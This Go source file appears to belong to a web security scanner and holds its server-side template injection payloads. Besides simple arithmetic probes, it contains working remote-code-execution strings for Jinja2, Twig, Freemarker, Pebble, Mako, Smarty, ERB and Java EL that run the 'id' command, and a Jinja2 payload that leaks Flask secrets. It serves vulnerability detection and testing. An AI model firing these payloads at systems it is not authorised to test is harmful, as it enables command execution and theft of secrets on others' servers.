package payloads

// SSTIPayloads returns Server-Side Template Injection payloads covering
// Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Smarty, and ERB engines.
// Aligned with OWASP A03:2021 / CWE-94.
func SSTIPayloads() PayloadSet {
	return PayloadSet{
		Category:    PayloadSSTI,
		Description: "Server-Side Template Injection payloads â€“ OWASP A03:2021 / CWE-94",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/3ac27901c711bdf3f5b65a7b1d1820a1/Server-Side%20Template%20Injection",
		Payloads: []Payload{
			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Probe / Detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-probe-arithmetic", Category: PayloadSSTI,
				Name: "Arithmetic Probe (Universal)", Value: `{{7*7}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `49`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Universal SSTI probe â€” reflected 49 indicates template evaluation",
			},
			{
				ID: "ssti-probe-string-mult", Category: PayloadSSTI,
				Name: "String Multiplication Probe", Value: `{{'vyomite'*3}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `vyomitevyomitevyomite`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "String repetition probe to distinguish Jinja2/Twig from non-SSTI",
			},
			{
				ID: "ssti-probe-erb", Category: PayloadSSTI,
				Name: "ERB Arithmetic Probe", Value: `<%= 7*7 %>`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `49`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Ruby", "ERB"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "ERB template probe â€” reflected 49 indicates Ruby template injection",
			},
			{
				ID: "ssti-probe-freemarker", Category: PayloadSSTI,
				Name: "Freemarker Arithmetic Probe", Value: `${7*7}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `49`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Java", "Freemarker"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Freemarker/EL expression probe",
			},
			{
				ID: "ssti-probe-velocity", Category: PayloadSSTI,
				Name: "Velocity Probe", Value: `#set($x=7*7)${x}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `49`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Java", "Velocity"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Apache Velocity template engine probe",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Jinja2 (Python) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-jinja2-config", Category: PayloadSSTI,
				Name: "Jinja2 Config Leak", Value: `{{config}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `(?i)(SECRET_KEY|DEBUG|DATABASE)`,
				RiskLevel: "SAFE", SafeMode: true, TargetStack: []string{"Python", "Flask", "Jinja2"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Flask config object access to leak SECRET_KEY and database URIs",
			},
			{
				ID: "ssti-jinja2-class-chain-id", Category: PayloadSSTI,
				Name: "Jinja2 MRO Chain (id)", Value: `{{''.__class__.__mro__[1].__subclasses__()[365]('id',shell=True,stdout=-1).communicate()}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Python", "Jinja2"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Jinja2 class hierarchy traversal to subprocess.Popen for RCE",
			},
			{
				ID: "ssti-jinja2-lipsum", Category: PayloadSSTI,
				Name: "Jinja2 lipsum() RCE", Value: `{{lipsum.__globals__['os'].popen('id').read()}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Python", "Jinja2"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Jinja2 lipsum globals access for OS command execution",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Twig (PHP) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-twig-id", Category: PayloadSSTI,
				Name: "Twig ID Probe", Value: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"PHP", "Twig"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Twig v1 RCE via registerUndefinedFilterCallback",
			},
			{
				ID: "ssti-twig-filter-map", Category: PayloadSSTI,
				Name: "Twig Filter Map RCE", Value: `{{['id']|filter('system')}}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"PHP", "Twig"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Twig v3 filter/map RCE technique",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Freemarker (Java) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-freemarker-exec", Category: PayloadSSTI,
				Name: "Freemarker Execute RCE", Value: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Java", "Freemarker"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Freemarker Execute utility class instantiation for RCE",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Pebble (Java) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-pebble-runtime-exec", Category: PayloadSSTI,
				Name: "Pebble Runtime Exec", Value: `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Java", "Pebble"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Pebble template engine RCE via Runtime.exec reflection",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Mako (Python) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-mako-import-os", Category: PayloadSSTI,
				Name: "Mako OS Import RCE", Value: `<%import os;x=os.popen('id').read()%>${x}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Python", "Mako"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Mako direct Python code execution via import",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Smarty (PHP) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-smarty-system", Category: PayloadSSTI,
				Name: "Smarty system() RCE", Value: `{system('id')}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"PHP", "Smarty"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Smarty PHP template engine direct system() call",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ERB (Ruby) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-erb-system", Category: PayloadSSTI,
				Name: "ERB System RCE", Value: `<%= system('id') %>`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Ruby", "ERB"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Ruby ERB template direct system() command execution",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Expression Language (Java) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "ssti-el-runtime-exec", Category: PayloadSSTI,
				Name: "Java EL Runtime Exec", Value: `${Runtime.getRuntime().exec("id")}`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `(?i)(Process|java\.lang)`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Java"},
				CWE: "CWE-94", OWASPCategory: "A03:2021",
				Description: "Java Expression Language injection for Runtime.exec()",
			},
		},
	}
}
